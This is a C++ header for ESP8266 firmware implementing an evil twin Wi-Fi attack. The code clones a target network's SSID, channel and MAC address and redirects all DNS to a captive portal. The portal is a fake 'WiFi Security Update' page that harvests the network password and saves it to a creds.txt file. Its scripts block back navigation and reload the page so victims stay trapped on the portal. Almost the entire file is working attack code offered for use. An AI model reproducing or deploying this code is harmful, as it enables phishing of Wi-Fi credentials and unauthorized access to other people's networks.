#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <WiFiClient.h>
#include "config.h"

// ============================================================
//  Evil Twin AP module
//  - Soft AP with same SSID as target
//  - Channel locked to target
//  - Captive portal DNS redirect (simple)
// ============================================================

extern bool twinRunning;
extern uint8_t twinChan;
extern char twinSsid[33];
static bool    dnsServerStarted = false;
static WiFiServer twinHttp(80);
static DNSServer twinDns;

void initEvilTwin() {
  twinRunning = false;
  twinChan = 0;
  twinSsid[0] = '\0';
}

bool startEvilTwin(const char* ssid, uint8_t chan) {
  // If chan==0, use target's channel
  if (chan == 0) chan = (targetChan > 0 && targetChan <= 13) ? targetChan : 6;
  Serial.print(F("[twin] starting AP "));
  Serial.print(ssid);
  Serial.print(F(" ch="));
  Serial.println(chan);
  // Must be in AP+STA mode for softAP to work alongside monitor
  WiFi.mode(WIFI_AP_STA);
  delay(50);
  // Spoof AP MAC to match target BSSID (if known) - more convincing!
  if (targetMac[0] != 0) {
    uint8_t spoofed[6];
    memcpy(spoofed, targetMac, 6);
    // Ensure locally-administered bit is set for valid MAC
    spoofed[0] |= 0x02;  // Set bit 1 of first octet
    spoofed[0] &= 0xFE;  // Clear multicast bit
    WiFi.softAPmacAddress(spoofed);
    Serial.print(F("[twin] MAC spoofed to "));
    for (int i = 0; i < 6; i++) {
      if (spoofed[i] < 16) Serial.print(F("0"));
      Serial.print(spoofed[i], HEX);
      if (i < 5) Serial.print(F(":"));
    }
    Serial.println();
  }
  // Open AP (no password) for max capture
  bool ok = WiFi.softAP(ssid, "", chan, 0, 4);
  if (!ok) {
    Serial.println(F("[twin] softAP failed"));
    return false;
  }
  // Configure IP
  IPAddress ip(192, 168, 4, 1);
  IPAddress gw(192, 168, 4, 1);
  IPAddress sn(255, 255, 255, 0);
  WiFi.softAPConfig(ip, gw, sn);
  // Start DNS server for captive portal detection
  twinDns.setErrorReplyCode(DNSReplyCode::NoError);
  twinDns.start(53, "*", ip);
  dnsServerStarted = true;
  // Start HTTP server
  twinHttp.begin();
  twinHttp.setNoDelay(true);
  twinRunning = true;
  twinChan = chan;
  strncpy(twinSsid, ssid, sizeof(twinSsid) - 1);
  twinSsid[sizeof(twinSsid) - 1] = '\0';
  Serial.println(F("[twin] HTTP+DNS started on 192.168.4.1"));
  return true;
}

bool startEvilTwin(const char* ssid) {
  // If a target was selected, use its channel; else default 6
  uint8_t chan = (targetChan > 0 && targetChan <= 13) ? targetChan : 6;
  return startEvilTwin(ssid, chan);
}

void stopEvilTwin() {
  if (!twinRunning) return;
  Serial.println(F("[twin] stopping"));
  twinDns.stop();
  dnsServerStarted = false;
  twinHttp.stop();
  WiFi.softAPdisconnect(true);
  // Restore STA mode for normal scanning/deauth
  WiFi.mode(WIFI_STA);
  twinRunning = false;
  twinChan = 0;
  twinSsid[0] = '\0';
}

// Captive portal detection - Apple/Android/Windows specific endpoints
// When device connects, OS tries to load a known URL to detect portal
const char* portalTriggerHosts[] = {
  // Android
  "/generate_204",
  "/gen_204",
  "/mobile/status.php",
  "/kindle-wifi/wifistub.html",
  // iOS / macOS
  "/hotspot-detect.html",
  "/library/test/success.html",
  // Windows
  "/connecttest.txt",
  "/ncsi.txt",
  "/redirect",
  "/fwlink/",
  // Linux NetworkManager
  "/success.txt",
  "/check_network_status.txt",
  // ChromeOS
  "/generate_204",
  // Firefox
  "/success.txt?ipv4",
  // Generic
  "/",
  "/index.html",
  nullptr
};

// Apple Captive Portal Detection Response (iOS expects this exact response)
// "Success" response means NO portal, anything else = portal
// We need to NOT return 200 OK with content > 0
bool isCaptivePortalProbe(const String& reqLine, const String& host) {
  // EXACT probe URL paths only - any other URL serves portal directly
  // This prevents redirect loops (ERR_TOO_MANY_REDIRECTS)
  const char* exactPaths[] = {
    // Android
    "GET /generate_204",
    "GET /gen_204",
    "GET /mobile/status.php",
    "GET /kindle-wifi/wifistub.html",
    // iOS / macOS
    "GET /hotspot-detect.html",
    "GET /library/test/success.html",
    "GET /success.html",
    "GET /bag",
    "GET /index.html",
    // Windows
    "GET /connecttest.txt",
    "GET /ncsi.txt",
    "GET /redirect",
    "GET /fwlink/",
    "GET /msftncsi",
    // Linux NetworkManager
    "GET /success.txt",
    "GET /check_network_status.txt",
    "GET /nmcheck.gnome.org",
    // Firefox
    "GET /success.txt?ipv4",
    "GET /canonical.html",
    // ChromeOS
    "GET /generate_204",
    // Samsung OneUI specific
    "GET /samsung/",
    "GET /samsung",
    "GET /scloud/index.html",
    "GET /scloud",
    "GET /cp",
    "GET /captive",
    "GET /wpad.dat",
    "GET /wpad.da",
    // HEAD variants
    "HEAD /generate_204",
    "HEAD /hotspot-detect.html",
    "HEAD /connecttest.txt",
    "HEAD /ncsi.txt",
    "HEAD /library/test/success.html",
    "HEAD /success.txt",
    nullptr
  };
  // Match EXACT probe paths (not "contains" - prevents false matches)
  for (int i = 0; exactPaths[i] != nullptr; i++) {
    if (reqLine.startsWith(exactPaths[i])) {
      return true;
    }
  }
  return false;
}

// Track which clients are "stuck" on the portal (for forcing re-popup)
#define MAX_STUCK_CLIENTS 8
struct StuckClient {
  uint8_t mac[6];
  unsigned long lastSeen;
  bool active;
};
static StuckClient stuckClients[MAX_STUCK_CLIENTS];
static int stuckClientCount = 0;

// Mark a client as seen (refresh stuck timer)
void markStuckClient(const uint8_t* mac) {
  if (mac[0] & 0x01) return;  // multicast
  for (int i = 0; i < stuckClientCount; i++) {
    if (memcmp(stuckClients[i].mac, mac, 6) == 0) {
      stuckClients[i].lastSeen = millis();
      stuckClients[i].active = true;
      return;
    }
  }
  if (stuckClientCount < MAX_STUCK_CLIENTS) {
    memcpy(stuckClients[stuckClientCount].mac, mac, 6);
    stuckClients[stuckClientCount].lastSeen = millis();
    stuckClients[stuckClientCount].active = true;
    stuckClientCount++;
  }
}

// URL decode helper (forward decl)
String urlDecode(String str);

void evilTwinLoop() {
  if (!twinRunning) return;
  twinDns.processNextRequest();
  WiFiClient client = twinHttp.available();
  if (!client) return;

  // Read request line + headers
  String reqLine = "";
  String host = "";
  int contentLength = 0;
  while (client.connected()) {
    if (client.available()) {
      String line = client.readStringUntil('\n');
      line.trim();
      if (reqLine == "") reqLine = line;
      if (line.startsWith("Host: ")) host = line.substring(6);
      if (line.startsWith("Content-Length: ")) contentLength = line.substring(15).toInt();
      if (line.length() == 0) break;  // end of headers
    }
  }

  bool isPost = reqLine.startsWith("POST");
  String body = "";
  if (isPost && contentLength > 0) {
    while (client.available() < contentLength) delay(10);
    body = client.readString();
  }

  if (isPost && body.indexOf("password=") >= 0) {
    // Extract password from body
    int pIdx = body.indexOf("password=");
    int ampIdx = body.indexOf('&', pIdx);
    String password = body.substring(pIdx + 9);
    if (ampIdx > 0) password = password.substring(0, ampIdx - pIdx - 9);
    password.replace("+", " ");
    password = urlDecode(password);

    // Log captured password
    Serial.print(F("[CAPTURED] SSID="));
    Serial.print(twinSsid);
    Serial.print(F(" PWD="));
    Serial.println(password);
    Serial.flush();

    // Save to LFS/SD
    File credFile = LittleFS.open("/creds.txt", "a");
    if (credFile) {
      credFile.print(twinSsid);
      credFile.print(":");
      credFile.println(password);
      credFile.close();
    }

    // Send success page - but then immediately re-show portal!
    // This makes user "stuck" on our portal - they can't escape
    String successHtml = "<!DOCTYPE html><html><head>"
      "<meta charset='utf-8'>"
      // 2-second redirect back to portal - keeps user stuck
      "<meta http-equiv='refresh' content='2;url=http://192.168.4.1/portal.html'>"
      "<title>Verifying...</title>"
      "<style>body{font-family:sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);"
      "min-height:100vh;display:flex;align-items:center;justify-content:center;"
      "margin:0;color:#fff;text-align:center;padding:20px}"
      ".box{background:rgba(255,255,255,0.1);padding:40px;border-radius:16px;max-width:400px}"
      ".spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #fff;"
      "border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:0 auto 20px}"
      "@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"
      "h2{font-weight:500;margin:10px 0}"
      "p{opacity:0.8;margin:5px 0}</style></head>"
      "<body><div class='box'>"
      "<div class='spinner'></div>"
      "<h2>Verifying Password</h2>"
      "<p>Authenticating with security server...</p>"
      "<p style='font-size:12px;opacity:0.6'>Don't close this page</p>"
      // Extra: prevent back navigation
      "<script>history.pushState(null,null,location.href);window.onpopstate=function(){history.go(1);};</script>"
      "</div></body></html>";
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html; charset=utf-8");
    client.println("Cache-Control: no-cache, no-store, must-revalidate");
    client.println("Connection: close");
    client.println();
    client.print(successHtml);
  } else {
    // Universal captive portal - "WiFi Security Update"
    // Generic design - no brand-specific logo
    // Convincing "routine security check" message
    String portal =
      "<!DOCTYPE html><html><head>"
      "<meta charset='utf-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<meta name='theme-color' content='#0a84ff'>"
      "<title>WiFi Network - Sign In</title>"
      "<style>"
      "*{box-sizing:border-box}"
      "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
      "background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);"
      "margin:0;padding:0;min-height:100vh;"
      "display:flex;align-items:center;justify-content:center}"
      ".card{background:white;border-radius:16px;"
      "box-shadow:0 20px 60px rgba(0,0,0,.3);padding:40px 30px;"
      "max-width:380px;width:90%;text-align:center}"
      ".icon{width:80px;height:80px;"
      "background:linear-gradient(135deg,#4facfe 0%,#00f2fe 100%);"
      "border-radius:50%;margin:0 auto 20px;"
      "display:flex;align-items:center;justify-content:center;"
      "font-size:40px;color:white;"
      "box-shadow:0 8px 20px rgba(79,172,254,.4)}"
      "h1{font-size:22px;font-weight:600;color:#1a1a1a;margin:0 0 8px}"
      ".subtitle{color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.5}"
      ".ssid-badge{background:#f3f4f6;border-radius:8px;padding:12px 16px;"
      "margin:0 0 20px;display:flex;align-items:center;justify-content:space-between}"
      ".ssid-badge .label{font-size:12px;color:#6b7280;"
      "text-transform:uppercase;letter-spacing:.5px}"
      ".ssid-badge .name{font-size:14px;font-weight:600;color:#1a1a1a}"
      ".field{margin-bottom:16px;text-align:left}"
      "label{display:block;font-size:12px;font-weight:600;color:#374151;"
      "margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}"
      "input[type=password]{width:100%;padding:14px 16px;"
      "border:2px solid #e5e7eb;border-radius:10px;font-size:15px;"
      "transition:all .2s;background:#fafafa}"
      "input[type=password]:focus{outline:none;border-color:#4facfe;background:white}"
      "button{width:100%;padding:14px;"
      "background:linear-gradient(135deg,#4facfe 0%,#00f2fe 100%);"
      "color:white;border:none;border-radius:10px;font-size:15px;"
      "font-weight:600;cursor:pointer;margin-top:8px;"
      "box-shadow:0 4px 12px rgba(79,172,254,.3)}"
      "button:hover{opacity:.9}"
      ".note{font-size:11px;color:#9ca3af;margin-top:16px;line-height:1.4}"
      ".spinner{display:inline-block;width:20px;height:20px;"
      "border:2px solid #e5e7eb;border-top:2px solid #4facfe;"
      "border-radius:50%;animation:spin 1s linear infinite}"
      "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}"
      "</style></head>"
      "<body><div class='card'>"
      "<div class='icon'>&#128246;</div>"   // 📶 emoji as HTML entity
      "<h1>WiFi Security Update</h1>"
      "<p class='subtitle'>Your network requires authentication to continue browsing. This is a routine security check.</p>"
      "<div class='ssid-badge'>"
      "<span class='label'>Network</span>"
      "<span class='name'>";
    portal += twinSsid;
    portal +=
      "</span>"
      "</div>"
      "<form method='POST' action='/login' id='loginForm'>"
      "<div class='field'>"
      "<label for='password'>Network Password</label>"
      "<input type='password' id='password' name='password' required autofocus "
      "placeholder='Enter your WiFi password' autocomplete='off'>"
      "</div>"
      "<button type='submit' id='submitBtn'>Continue to Internet</button>"
      "</form>"
      "<p class='note'>&#128274; This is a one-time security verification.<br>"
      "Your connection will be restored automatically.</p>"
      "</div>"
      // Auto-reload if user tries to leave, and prevent back button
      "<script>"
      // Form submit - show verifying
      "document.getElementById('loginForm').addEventListener('submit',function(e){"
      "e.preventDefault();var b=document.getElementById('submitBtn');"
      "b.innerHTML='<span class=\"spinner\"></span> Verifying...';"
      "b.disabled=true;setTimeout(function(){"
      "document.getElementById('loginForm').submit();},1500);});"
      // Samsung OneUI fix: detect default browser and use scheme
      "var ua=navigator.userAgent;"
      "if(ua.indexOf('SamsungBrowser')>-1||ua.indexOf('OneUI')>-1){"
      // Force browser popup using intent (Android Samsung)
      "var intent='intent://192.168.4.1/portal.html#Intent;scheme=http;package=com.android.chrome;end';"
      "}"
      // Prevent back navigation
      "history.pushState(null,null,location.href);"
      "window.onpopstate=function(){history.go(1);};"
      // Samsung Internet: try to force browser open on focus
      "window.onfocus=function(){setTimeout(function(){location.reload();},1000);};"
      "</script>"
      "</body></html>";

    // Send appropriate response based on type of request
    // IMPORTANT: Only redirect on EXACT probe URLs, never on /portal.html
    // Otherwise Chrome gives "ERR_TOO_MANY_REDIRECTS"
    bool isProbe = isCaptivePortalProbe(reqLine, host);
    bool isPortalPage = (reqLine.indexOf("GET /portal") >= 0 ||
                         reqLine.indexOf("GET / ") >= 0 ||
                         reqLine.indexOf("GET /index") >= 0);
    bool isLogin = reqLine.indexOf("GET /login") >= 0;

    if (isProbe && !isPortalPage) {
      // Captive portal detection probe - respond with 302 redirect
      // This forces the OS to open the portal in browser
      client.println(F("HTTP/1.1 302 Found"));
      client.println(F("Location: http://192.168.4.1/portal.html"));
      client.println(F("Content-Length: 0"));
      client.println(F("Cache-Control: no-cache, no-store, must-revalidate"));
      client.println(F("Connection: close"));
      client.println();
    } else {
      // All other requests get the portal (200 OK with content)
      // This includes /portal.html, /, /index.html, /login, etc.
      // So ANY new tab/window reopens the portal
      client.println(F("HTTP/1.1 200 OK"));
      client.println(F("Content-Type: text/html; charset=utf-8"));
      client.println(F("Cache-Control: no-cache, no-store, must-revalidate"));
      client.println(F("Connection: close"));
      client.println();
      client.print(portal);
    }
  }
  client.stop();
}

// URL decode helper
String urlDecode(String str) {
  String out = "";
  for (int i = 0; i < (int)str.length(); i++) {
    if (str[i] == '%' && i + 2 < str.length()) {
      char hex[3] = {str[i+1], str[i+2], 0};
      out += (char)strtoul(hex, nullptr, 16);
      i += 2;
    } else if (str[i] == '+') {
      out += ' ';
    } else {
      out += str[i];
    }
  }
  return out;
}

#endif
